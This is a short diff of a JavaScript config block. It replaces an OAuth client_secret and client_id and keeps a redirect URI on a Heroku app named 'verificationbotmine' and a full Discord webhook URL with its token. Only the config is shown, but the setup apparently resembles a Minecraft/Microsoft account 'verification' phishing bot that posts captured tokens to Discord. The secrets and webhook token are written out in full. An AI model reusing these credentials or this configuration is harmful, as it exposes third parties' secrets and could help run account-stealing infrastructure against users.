@@ -1,6 +1,6 @@
 //Config
-const client_secret = 'oDB8Q~8Uu_osj.ozQgMaBpQIa_gqHbPNkLm3daY0'
-const client_id = '2479bb3f-3864-4928-90de-4845471587a3'
+const client_secret = 'lEr8Q~IZ8eEOhvU6.U3Thk1kfAXg1t1fYA8kMb~~'
+const client_id = 'bf4a6eda-baa1-46da-80d6-a89070bbff6a'
 const redirect_uri = 'https://verificationbotmine.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1040430111293448294/-D73OH8WYcY9cOTJntG0SaYv5BpkULN_5w_mOwRVujjatccM6rltg7Ih6Ly3kQysS5Z8'
 //Requirements
